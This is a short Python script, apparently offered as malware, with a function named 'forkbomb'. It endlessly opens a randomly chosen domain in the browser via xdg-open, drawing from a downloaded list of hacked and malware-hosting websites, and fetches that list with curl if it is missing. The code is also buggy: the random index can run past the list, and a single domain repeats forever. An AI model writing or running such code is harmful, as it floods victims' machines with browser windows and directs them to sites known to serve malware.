import os
import random
def forkbomb():
  mal = True
  number = 0
  file = os.getcwd() + "/domains.txt"
  if os.path.isfile(file) == True:
    file = open("domains.txt")
    content = file.readlines()
    num = random.randint(0, len(content))
    while mal == True:
      os.system("xdg-open " + content[int(num)])
      number += 1
      if number == 100:
        mal = False
        if mal == False:
          number = 0
          mal = True
  if os.path.isfile(file) == False:
    os.system("curl -O https://raw.githubusercontent.com/mitchellkrogza/The-Big-List-of-Hacked-Malware-Web-Sites/refs/heads/master/.dev-tools/_strip_domains/domains.txt")
